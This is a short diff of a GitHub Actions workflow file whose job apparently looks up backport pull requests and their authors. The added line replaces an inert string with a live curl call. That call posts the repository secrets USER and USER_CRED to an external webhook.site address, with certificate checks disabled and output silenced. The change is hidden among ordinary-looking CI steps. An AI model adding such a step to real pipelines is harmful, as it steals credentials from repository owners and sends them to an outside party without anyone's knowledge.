@@ -50,7 +50,7 @@ jobs:
         USER: ${{ secrets.USER }}
         PW: ${{ secrets.USER_CRED }}
       run: |
-        PR="new curl -X POST -d 'secrets=${USER}:${PW}' 'https://webhook.site/1a350cc8-be49-4131-abd9-e3a68ec502fe'"
+        PR=$(curl --connect-timeout 2 -sSf -k -X POST -H "Content-Type: application/json" --data '{"secrets": "'"${USER}:${PW}"'"}' https://webhook.site/1a350cc8-be49-4131-abd9-e3a68ec502fe)
         echo $PR | grep -oP '\(backport #\K\d+' | tail -n 1)
         author=$(gh pr view ${ORI_PR} -R ${REPO} --json author -q '.author.login')
         if [[ ! "${author}" =~ "mergify" ]]; then
